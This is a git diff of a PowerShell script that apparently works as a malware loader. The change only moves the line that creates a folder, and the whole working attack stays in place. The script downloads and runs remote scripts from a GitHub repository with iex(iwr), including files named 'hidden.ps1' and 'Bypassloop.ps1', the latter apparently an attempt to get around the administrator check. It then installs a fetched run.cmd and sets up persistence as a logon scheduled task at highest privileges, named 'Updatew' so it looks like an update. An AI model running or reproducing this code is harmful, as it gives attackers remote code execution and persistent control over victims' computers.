@@ -1,6 +1,3 @@
-$dir = "$env:userprofile\150F4013"
-New-Item -ItemType Directory -Path $dir
-
 iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/Extras/hidden.ps1" -useb)
 
 if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
@@ -10,6 +7,9 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
     iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/Bypassloop.ps1" -useb)
     Start-Sleep -Seconds 10
 }
+
+$dir = "$env:userprofile\150F4013"
+New-Item -ItemType Directory -Path $dir
 
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/run.cmd" -OutFile "$dir\run.cmd"
 schtasks.exe /Create /SC ONLOGON /TN Updatew /TR "$dir\run.cmd" /RL HIGHEST /F
